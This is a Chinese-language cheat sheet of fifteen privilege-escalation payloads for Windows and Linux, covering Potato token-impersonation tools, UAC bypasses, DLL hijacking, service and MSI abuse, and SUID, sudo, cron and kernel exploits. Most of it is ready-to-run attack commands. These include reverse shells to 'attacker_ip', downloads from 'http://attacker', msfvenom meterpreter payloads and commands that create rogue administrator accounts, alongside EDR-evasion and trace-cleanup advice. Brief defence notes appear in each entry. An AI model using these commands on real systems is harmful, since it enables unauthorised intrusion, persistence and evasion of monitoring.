# 权限提升

_15 条 intranet payload_

### 令牌窃取与模拟  `privilege-token`
_窃取和模拟Windows访问令牌_
子类：**令牌操作** · tags: `token` `privilege` `impersonation` `windows`

**前置条件：**
- 已获得目标机器权限
- SeImpersonatePrivilege权限
- Windows系统

**攻击链：**

**列出令牌**
> 列出系统中所有可用令牌
_platform: windows_
```
mimikatz.exe "privilege::debug" "token::list" "exit"
```

**窃取令牌**
> 窃取指定用户的令牌
_platform: windows_
```
mimikatz.exe "privilege::debug" "token::elevate /domainuser:Administrator" "exit"
```

**JuicyPotato攻击**
> JuicyPotato提权（需要SeImpersonatePrivilege）
_platform: windows_
```
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
```
**语法解析：**
- `JuicyPotato.exe` — DCOM DCE/RPC本地提权工具 _command_
- `-l` — 监听端口 _parameter_
- `-p` — 要执行的程序 _parameter_
- `-c` — CLSID _parameter_

**PrintSpoofer**
> PrintSpoofer提权
_platform: windows_
```
PrintSpoofer.exe -i -c cmd
```

**GodPotato**
> GodPotato提权，支持更多Windows版本
_platform: windows_
```
GodPotato.exe -cmd "cmd /c whoami"
```

**EDR 绕过变体：**

**RoguePotato**
> RoguePotato，绕过更多限制
```
RoguePotato.exe -r attacker_ip -l 9999 -e "cmd.exe"
```


**分析：** 令牌窃取成功后可以模拟高权限用户身份执行操作。

**OPSEC 提示：**
- Potato系列工具利用DCOM机制
- 需要SeImpersonatePrivilege权限
- 不同Windows版本需要不同的CLSID

**概述：** Windows访问令牌(Access Token)包含用户身份和权限信息，攻击者可以窃取高权限用户的令牌来提升权限。

**漏洞原理：** Windows允许进程模拟其他用户的令牌，如果服务账户具有SeImpersonatePrivilege权限，攻击者可以利用此权限获取SYSTEM权限。

**利用方法：** 利用流程：1) 获取SeImpersonatePrivilege权限的服务账户；2) 使用Potato系列工具触发SYSTEM进程连接；3) 窃取SYSTEM令牌；4) 以SYSTEM权限执行命令。

**防御措施：** 防御措施：1) 移除不必要的服务账户SeImpersonatePrivilege权限；2) 监控令牌操作；3) 部署EDR检测异常行为；4) 及时更新系统补丁。

---

### Windows权限提升  `windows-privesc`
_Windows系统提权技术_
子类：**Windows** · tags: `privesc` `windows` `privilege`

**前置条件：**
- 普通用户权限
- 系统漏洞

**攻击链：**

**检查提权向量**
> 检查当前权限
_platform: windows_
```
whoami /priv
whoami /groups
```

**使用WinPEAS**
> 自动化提权检查
_platform: windows_
```
winpeas.exe
```

**检查服务权限**
> 检查可写服务
_platform: windows_
```
accesschk.exe -uwcqv "Everyone" *
```

**检查未引用服务路径**
> 查找未引用服务路径
_platform: windows_
```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"  | findstr /i /v """
```


**概述：** Windows提权涉及多种向量，包括服务、DLL、注册表等。

**漏洞原理：** 配置错误、权限不当、内核漏洞。

**利用方法：** 利用流程：1) 枚举系统 2) 发现漏洞 3) 利用提权

**防御措施：** 防御措施：1) 最小权限原则 2) 及时更新补丁 3) 监控特权操作

---

### Linux权限提升  `linux-privesc`
_Linux系统提权技术_
子类：**Linux** · tags: `privesc` `linux` `privilege`

**前置条件：**
- 普通用户权限
- 系统漏洞

**攻击链：**

**检查SUID**
> 查找SUID文件
_platform: linux_
```
find / -perm -4000 -type f 2>/dev/null
```
**语法解析：**
- `find /` — 从根目录开始搜索 _keyword_
- `-perm -4000` — SUID权限位 _parameter_
- `-type f` — 只搜索文件 _parameter_

**检查Sudo**
> 检查sudo权限
_platform: linux_
```
sudo -l
```

**检查Cron**
> 检查计划任务
_platform: linux_
```
cat /etc/crontab
ls -la /etc/cron*
```

**使用LinPEAS**
> 自动化提权检查
_platform: linux_
```
linpeas.sh
```


**概述：** Linux提权涉及SUID、Sudo、Cron、内核漏洞等。

**漏洞原理：** 配置错误、SUID滥用、内核漏洞。

**利用方法：** 利用流程：1) 枚举系统 2) 发现漏洞 3) 利用提权

**防御措施：** 防御措施：1) 最小权限原则 2) 更新内核 3) 监控特权操作

---

### UAC绕过  `uac-bypass`
_绕过Windows用户账户控制_
子类：**UAC** · tags: `uac` `bypass` `windows`

**前置条件：**
- 管理员组成员
- UAC启用

**攻击链：**

**Fodhelper**
> 通过fodhelper绕过UAC
_platform: windows_
```
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /d "" /f
fodhelper.exe
```

**Eventvwr**
> 通过eventvwr绕过UAC
_platform: windows_
```
reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /d "cmd.exe" /f
eventvwr.exe
```

**使用UACME**
> 使用UACME工具
_platform: windows_
```
Akagi64.exe 23 cmd.exe
```


**概述：** UAC可以通过特定程序或注册表操作绕过。

**漏洞原理：** 某些系统程序自动提升权限。

**利用方法：** 利用流程：1) 识别绕过方法 2) 修改注册表 3) 触发执行

**防御措施：** 防御措施：1) 设置UAC为最高级别 2) 监控注册表修改

---

### DLL劫持  `dll-hijack`
_通过DLL劫持提权_
子类：**DLL** · tags: `dll` `hijack` `privesc`

**前置条件：**
- 可写目录
- DLL搜索顺序

**攻击链：**

**查找DLL劫持**
> 监控进程加载的DLL
_platform: windows_
```
使用Procmon监控DLL加载
```

**创建恶意DLL**
> 生成恶意DLL
_platform: linux_
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll > evil.dll
```

**放置DLL**
> 放置DLL到目标位置
_platform: windows_
```
copy evil.dll "C:\Program Files\VulnerableApp\missing.dll"
```


**概述：** DLL劫持利用DLL搜索顺序加载恶意DLL。

**漏洞原理：** DLL搜索顺序优先当前目录。

**利用方法：** 利用流程：1) 找到可劫持DLL 2) 创建恶意DLL 3) 触发加载

**防御措施：** 防御措施：1) 使用绝对路径 2) 安全DLL搜索模式

---

### 服务提权  `service-exploit`
_通过服务漏洞提权_
子类：**服务** · tags: `service` `privesc` `windows`

**前置条件：**
- 服务修改权限
- 可写服务路径

**攻击链：**

**检查服务权限**
> 检查用户可修改的服务
_platform: windows_
```
accesschk.exe -uwcqv "Users" *
```

**修改服务路径**
> 修改服务执行路径
_platform: windows_
```
sc config VulnerableService binPath= "cmd /c whoami"
```

**重启服务**
> 重启服务执行命令
_platform: windows_
```
sc stop VulnerableService
sc start VulnerableService
```


**概述：** 服务配置不当可导致提权。

**漏洞原理：** 服务权限配置错误，路径可写。

**利用方法：** 利用流程：1) 枚举服务 2) 检查权限 3) 修改执行

**防御措施：** 防御措施：1) 正确设置服务权限 2) 使用引号路径

---

### AlwaysInstallElevated提权  `always-install`
_利用AlwaysInstallElevated提权_
子类：**MSI** · tags: `msi` `alwaysinstall` `privesc`

**前置条件：**
- AlwaysInstallElevated启用

**攻击链：**

**检查设置**
> 检查是否启用
_platform: windows_
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**创建MSI**
> 生成恶意MSI
_platform: linux_
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f msi > evil.msi
```

**安装MSI**
> 安装MSI执行代码
_platform: windows_
```
msiexec /quiet /qn /i evil.msi
```


**概述：** AlwaysInstallElevated允许用户以SYSTEM权限安装MSI。

**漏洞原理：** 注册表配置允许任何用户以高权限安装。

**利用方法：** 利用流程：1) 检查设置 2) 创建MSI 3) 安装执行

**防御措施：** 防御措施：1) 禁用AlwaysInstallElevated 2) 监控MSI安装

---

### Juicy Potato提权  `juicy-potato`
_利用COM对象和SeImpersonatePrivilege提权_
子类：**Potato** · tags: `juicy-potato` `com` `privesc`

**前置条件：**
- SeImpersonatePrivilege
- Windows < 2019

**攻击链：**

**检查权限**
> 检查SeImpersonatePrivilege
_platform: windows_
```
whoami /priv | findstr SeImpersonate
```

**执行JuicyPotato**
> 使用JuicyPotato提权
_platform: windows_
```
JuicyPotato.exe -t * -p cmd.exe -l 1337
```
**语法解析：**
- `-t *` — 创建进程类型 _parameter_
- `-p cmd.exe` — 要执行的程序 _parameter_
- `-l 1337` — 监听端口 _parameter_


**概述：** Juicy Potato利用COM对象和SeImpersonatePrivilege提权。

**漏洞原理：** COM对象可被滥用获取SYSTEM权限。

**利用方法：** 利用流程：1) 检查权限 2) 选择CLSID 3) 执行提权

**防御措施：** 防御措施：1) 移除SeImpersonatePrivilege 2) 升级Windows

---

### PrintSpoofer提权  `printspoofer`
_利用打印机服务提权_
子类：**PrintSpoofer** · tags: `printspoofer` `privesc` `windows`

**前置条件：**
- SeImpersonatePrivilege

**攻击链：**

**执行PrintSpoofer**
> 使用PrintSpoofer提权
_platform: windows_
```
PrintSpoofer.exe -i -c cmd
```

**指定命令**
> 执行指定命令
_platform: windows_
```
PrintSpoofer.exe -c "whoami > C:\out.txt"
```


**概述：** PrintSpoofer利用打印机服务获取SYSTEM权限。

**漏洞原理：** 打印机服务允许特权模拟。

**利用方法：** 利用流程：1) 检查权限 2) 执行PrintSpoofer

**防御措施：** 防御措施：1) 移除SeImpersonatePrivilege 2) 禁用打印服务

---

### GodPotato提权  `godpotato`
_GodPotato提权工具_
子类：**GodPotato** · tags: `godpotato` `privesc` `windows`

**前置条件：**
- SeImpersonatePrivilege

**攻击链：**

**执行GodPotato**
> 使用GodPotato提权
_platform: windows_
```
GodPotato.exe -cmd "cmd /c whoami"
```

**反向Shell**
> 执行反向Shell
_platform: windows_
```
GodPotato.exe -cmd "cmd /c powershell -e BASE64_CMD"
```


**概述：** GodPotato是JuicyPotato的改进版，支持更多Windows版本。

**漏洞原理：** COM对象和特权模拟漏洞。

**利用方法：** 利用流程：1) 检查权限 2) 执行GodPotato

**防御措施：** 防御措施：1) 移除SeImpersonatePrivilege 2) 更新系统

---

### SUID提权  `suid-exploit`
_利用SUID文件提权_
子类：**SUID** · tags: `suid` `privesc` `linux`

**前置条件：**
- 存在SUID文件
- 可利用程序

**攻击链：**

**查找SUID**
> 查找所有SUID文件
_platform: linux_
```
find / -perm -4000 -type f 2>/dev/null
```

**常见可利用程序**
> 常见SUID利用方法
_platform: linux_
```
nmap --interactive
vim -c ':!/bin/sh'
find / -exec /bin/sh \;
cp /bin/sh /tmp/sh; chmod +s /tmp/sh
```

**GTFOBins**
> 查找程序利用方法
_platform: linux_
```
参考GTFOBins网站查找可利用程序
```


**概述：** SUID文件以文件所有者权限执行，可能被利用提权。

**漏洞原理：** SUID程序存在漏洞或可被滥用。

**利用方法：** 利用流程：1) 查找SUID文件 2) 分析可利用性 3) 执行提权

**防御措施：** 防御措施：1) 审计SUID文件 2) 移除不必要的SUID

---

### Sudo提权  `sudo-exploit`
_利用Sudo配置提权_
子类：**Sudo** · tags: `sudo` `privesc` `linux`

**前置条件：**
- Sudo权限配置不当

**攻击链：**

**检查Sudo权限**
> 列出可执行的sudo命令
_platform: linux_
```
sudo -l
```

**常见利用**
> 常见sudo利用方法
_platform: linux_
```
sudo vim -c ':!/bin/sh'
sudo find / -exec /bin/sh \;
sudo awk 'BEGIN {system("/bin/sh")}'
```

**CVE-2021-3156**
> Baron Samedit漏洞
_platform: linux_
```
利用sudo堆溢出漏洞
```


**概述：** Sudo配置不当允许用户以root执行特定命令。

**漏洞原理：** Sudo规则允许执行可逃逸的程序。

**利用方法：** 利用流程：1) 检查sudo权限 2) 找到可利用程序 3) 执行提权

**防御措施：** 防御措施：1) 限制sudo规则 2) 使用NOEXEC标签

---

### Cron提权  `cron-exploit`
_利用Cron任务提权_
子类：**Cron** · tags: `cron` `privesc` `linux`

**前置条件：**
- 可写Cron脚本
- 通配符注入

**攻击链：**

**检查Cron任务**
> 查看计划任务
_platform: linux_
```
cat /etc/crontab
ls -la /etc/cron*
```

**检查脚本权限**
> 检查Cron脚本权限
_platform: linux_
```
ls -la /path/to/cron/script.sh
```

**通配符注入**
> 利用tar通配符注入
_platform: linux_
```
在Cron目录创建: --checkpoint=1
--checkpoint-action=exec=sh shell.sh
```


**概述：** Cron任务以特定用户执行，可被利用提权。

**漏洞原理：** 脚本可写、通配符注入、PATH劫持。

**利用方法：** 利用流程：1) 检查Cron任务 2) 发现漏洞 3) 利用提权

**防御措施：** 防御措施：1) 使用绝对路径 2) 限制脚本权限 3) 避免通配符

---

### 内核漏洞提权  `kernel-exploit`
_利用内核漏洞提权_
子类：**内核** · tags: `kernel` `privesc` `exploit`

**前置条件：**
- 存在内核漏洞
- 可编译/执行exploit

**攻击链：**

**检查内核版本**
> 查看内核版本信息
_platform: linux_
```
uname -a
cat /proc/version
```

**搜索exploit**
> 搜索内核exploit
_platform: linux_
```
searchsploit kernel VERSION
```

**常见内核漏洞**
> 常见内核提权漏洞
_platform: linux_
```
DirtyCow (CVE-2016-5195)
DirtyPipe (CVE-2022-0847)
PwnKit (CVE-2021-4034)
```


**概述：** 内核漏洞可以直接获取root权限。

**漏洞原理：** 内核代码存在漏洞，可被利用。

**利用方法：** 利用流程：1) 识别内核版本 2) 找到对应exploit 3) 编译执行

**防御措施：** 防御措施：1) 及时更新内核 2) 使用SELinux 3) 限制编译环境

---

### Potato系列提权攻击  `potato-attack`
_利用Windows令牌模拟和NTLM中继机制从服务账户(SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege)提权到SYSTEM_
子类：**Potato提权** · tags: `privilege-escalation` `potato` `token-impersonation` `ntlm-relay` `windows`

**前置条件：**
- 拥有SeImpersonatePrivilege或SeAssignPrimaryTokenPrivilege权限
- 常见于IIS AppPool、SQL Server、各类服务账户

**攻击链：**

**检查当前权限**
> 首先确认当前用户是否拥有令牌模拟权限。IIS应用池账户、SQL Server服务账户、Windows服务账户通常默认拥有该权限
_platform: windows_
```
# 检查是否拥有Impersonate权限
whoami /priv

# 重点关注以下权限:
# SeImpersonatePrivilege - 模拟客户端令牌
# SeAssignPrimaryTokenPrivilege - 替换进程级令牌

# 确认当前用户身份
whoami /all
echo %USERNAME%
```
**语法解析：**
- `whoami /priv` — 列出当前用户所有特权 _command_
- `SeImpersonatePrivilege` — 允许模拟其他用户令牌的关键特权 _value_
- `SeAssignPrimaryTokenPrivilege` — 允许为新进程分配令牌 _value_

**JuicyPotato (Windows Server 2016/2019)**
> JuicyPotato利用COM服务器和NTLM认证实现令牌模拟。通过创建本地COM服务器，欺骗SYSTEM账户向其认证，然后模拟该令牌执行命令
_platform: windows_
```
# 下载JuicyPotato
certutil -urlcache -split -f http://attacker/JuicyPotato.exe C:\temp\jp.exe

# 使用JuicyPotato提权执行命令
C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\temp\proof.txt" -t *

# 使用特定CLSID (不同系统需要不同CLSID)
C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user testadmin Test@123 /add && net localgroup administrators testadmin /add" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

# 反弹Shell
C:\temp\jp.exe -l 1337 -p C:\temp\nc.exe -a "-e cmd.exe attacker_ip 4444" -t *
```
**语法解析：**
- `-l 1337` — COM服务器监听端口 _parameter_
- `-p` — 要以SYSTEM权限执行的程序 _parameter_
- `-a` — 传递给程序的参数 _parameter_
- `-t *` — 同时尝试CreateProcessWithToken和CreateProcessAsUser _parameter_
- `-c {CLSID}` — 指定COM对象CLSID(需匹配目标系统版本) _parameter_

**PrintSpoofer (Windows 10/Server 2019+)**
> PrintSpoofer利用Windows打印服务的命名管道模拟功能。它创建一个命名管道并欺骗Print Spooler服务连接，从而获取SYSTEM令牌。适用于JuicyPotato无法使用的新版Windows
_platform: windows_
```
# PrintSpoofer - 利用打印服务命名管道
PrintSpoofer.exe -i -c cmd

# 直接执行命令
PrintSpoofer.exe -c "cmd /c whoami > C:\temp\proof.txt"

# 反弹Shell
PrintSpoofer.exe -c "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe"

# 以SYSTEM身份启动PowerShell
PrintSpoofer.exe -i -c powershell.exe
```
**语法解析：**
- `-i` — 交互模式(获取交互式Shell) _parameter_
- `-c cmd` — 以SYSTEM权限执行的命令 _parameter_

**Sweet Potato (多技术集成)**
> SweetPotato集成了PrintSpoofer、EfsPotato等多种技术，自动选择适合目标系统的攻击方式
_platform: windows_
```
# SweetPotato - 集成多种Potato技术
SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"

# 指定攻击方式
SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c net user testadmin Test@123 /add"
```
**语法解析：**
- `-e EfsRpc` — 指定使用EFS RPC攻击向量 _parameter_
- `-p` — 要执行的程序路径 _parameter_

**GodPotato (全版本通杀)**
> GodPotato利用DCOM OXID解析器的漏洞，无需指定CLSID，兼容几乎所有Windows版本。是目前最通用的Potato变种
_platform: windows_
```
# GodPotato - 适用于Windows Server 2012-2022所有版本
GodPotato.exe -cmd "cmd /c whoami"

# 执行反弹Shell
GodPotato.exe -cmd "cmd /c C:\temp\nc.exe -e cmd.exe attacker_ip 4444"

# 添加管理员
GodPotato.exe -cmd "net user testadmin Test@123 /add && net localgroup administrators testadmin /add"

# 执行PowerShell
GodPotato.exe -cmd "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
```
**语法解析：**
- `-cmd` — 以SYSTEM权限执行的命令 _parameter_
- `GodPotato.exe` — 全版本兼容的Potato提权工具 _command_

**RoguePotato (远程场景)**
> RoguePotato是JuicyPotato的改进版，通过远程OXID解析器实现NTLM认证中继。需要一台攻击机辅助完成中继
_platform: windows_
```
# 攻击机 - 启动socat重定向
socat tcp-listen:135,reuseaddr,fork tcp:target_ip:9999

# 目标机 - 执行RoguePotato
RoguePotato.exe -r attacker_ip -e "cmd /c whoami > C:\temp\proof.txt" -l 9999

# 或使用netcat反弹
RoguePotato.exe -r attacker_ip -e "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe" -l 9999
```
**语法解析：**
- `-r attacker_ip` — 攻击机IP(运行OXID解析器) _parameter_
- `-l 9999` — 本地监听端口 _parameter_
- `-e` — 要执行的命令 _parameter_

**Potato选型决策流程**
> 根据目标系统版本选择合适的Potato变种工具
_platform: windows_
```
# === 决策流程 ===
# 1. whoami /priv 确认SeImpersonatePrivilege
# 2. systeminfo 确认系统版本
#
# Windows Server 2012-2016 => JuicyPotato
# Windows Server 2019 (1809之前) => JuicyPotato (需正确CLSID)
# Windows 10/Server 2019+ => PrintSpoofer 或 GodPotato
# Windows Server 2022 => GodPotato
# 所有版本 => SweetPotato (自动选择)
# 需要远程中继 => RoguePotato
#
# 常用CLSID查询: https://ohpe.it/juicy-potato/CLSID/
```

**EDR 绕过变体：**

**绕过EDR检测的Potato技巧**
> 通过反射加载、重命名、使用较新工具等方式绕过EDR对Potato工具的检测
_platform: windows_
```
# 1. 重命名二进制文件
ren GodPotato.exe svcutil.exe

# 2. 使用.NET反射加载(无文件落地)
powershell -ep bypass -c "$bytes=[System.IO.File]::ReadAllBytes('C:\temp\gp.exe');[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,@(,@('-cmd','cmd /c whoami')))";

# 3. 使用SharpToken替代(较新工具,签名较少)
SharpToken.exe execute SYSTEM "cmd /c whoami"
```


**分析：** Potato系列攻击利用Windows的令牌模拟机制——拥有SeImpersonatePrivilege的服务账户可以模拟向其认证的任何用户令牌。攻击者通过欺骗SYSTEM账户向本地COM服务器/命名管道认证，获取SYSTEM令牌后创建高权限进程。这是Web服务器(IIS)和数据库(SQL Server)提权最常见的方式之一。

**OPSEC 提示：**
- 1) Potato工具的二进制文件特征明显，建议内存加载 2) 创建的命名管道名称可能被监控 3) 成功后立即清理工具和临时文件 4) 避免使用net user等敏感命令，改用更隐蔽的后渗透方式

**概述：** Potato系列是Windows环境下从服务账户提权到SYSTEM的经典攻击技术，利用令牌模拟和NTLM中继实现。

**漏洞原理：** Windows服务账户(IIS/SQL Server等)默认拥有SeImpersonatePrivilege权限。攻击者可利用此权限通过DCOM/命名管道欺骗SYSTEM账户认证，模拟其令牌实现提权。

**利用方法：** 利用流程：1) whoami /priv确认Impersonate权限 2) 根据系统版本选择合适的Potato工具 3) 执行Potato获取SYSTEM权限 4) 进行后渗透操作

**防御措施：** 防御措施：1) 最小权限原则，移除不必要的SeImpersonatePrivilege 2) 使用gMSA账户运行服务 3) 监控异常令牌操作和命名管道创建 4) 及时更新Windows补丁

**参考：**
- <https://attack.mitre.org/techniques/T1134/001/>
- <https://github.com/BeichenDream/GodPotato>

---
